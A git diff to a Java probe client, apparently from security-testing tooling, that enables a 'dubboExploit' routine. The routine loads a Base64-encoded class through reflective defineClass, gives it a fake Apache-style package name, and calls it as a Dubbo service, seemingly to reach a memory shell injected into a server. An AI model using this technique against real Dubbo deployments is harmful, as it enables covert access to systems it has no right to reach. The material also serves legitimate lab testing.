@@ -1,4 +1,4 @@
-package com.reajason.javaweb.vuldubbo278;
+package com.reajason.javaweb.dubbo;
 
 import com.caucho.hessian.client.HessianProxyFactory;
 import com.caucho.hessian.io.HessianRemoteObject;
@@ -18,11 +18,11 @@ public class ProbeClient {
 
     public static void main(String[] args) throws Exception {
 //        dubboSayHello("dubbo://127.0.0.1:12345/demo_say_hello");
-//        try {
-//            dubboExploit();
-//        } catch (Exception e) {
-//            e.printStackTrace();
-//        }
+        try {
+            dubboExploit();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 //        exploit();
     }
 
@@ -58,9 +58,9 @@ public class ProbeClient {
     }
 
     public static void dubboExploit() throws Exception {
-        String url = "dubbo://192.168.31.206:12345/org.apache.http.web.handlers.wJMhG.OAuthDubboService";
-        String b = "H4sIAAAAAAAA/zv1b9c+BgYGEwZ2Rgaz/KJ0/cSCxOSMVP2MkpIC/fLUJP2MxLyUnNSiYv1yL98Md31/x9KSDJfSpKT84NSisszkVBVDdgZGRgaBrMSyRP2cxLx0ff+krNTkEnYGZkYGNohuIEMj2kkz2omNkYGJgYUBBBhZGBlYGdhATAD+bjiShAAAAA==";
-        byte[] bytes = gzipDecompress(Base64.getDecoder().decode(b));
+        String url = "dubbo://198.18.0.1:50051/org.apache.http.web.handlers.VTcIU.AuthDubboService";
+        String b = "yv66vgAAADQABwEANW9yZy9hcGFjaGUvaHR0cC93ZWIvaGFuZGxlcnMvVlRjSVUvQXV0aER1YmJvU2VydmljZSQxBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABmhhbmRsZQEABihbQilbQgYBAAIABAAAAAAAAQQBAAUABgAAAAA=";
+        byte[] bytes = Base64.getDecoder().decode(b);
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         defineClass.setAccessible(true);
         ClassLoader classLoader = ClassGenerator.class.getClassLoader();
@@ -70,6 +70,7 @@ public class ProbeClient {
         reference.setApplication(new ApplicationConfig("dubbo-consumer"));
         reference.setInterface(clazz);
         reference.setVersion("1.0.0");
+        reference.setProxy("jdk");
         reference.setUrl(url);
 
         try {
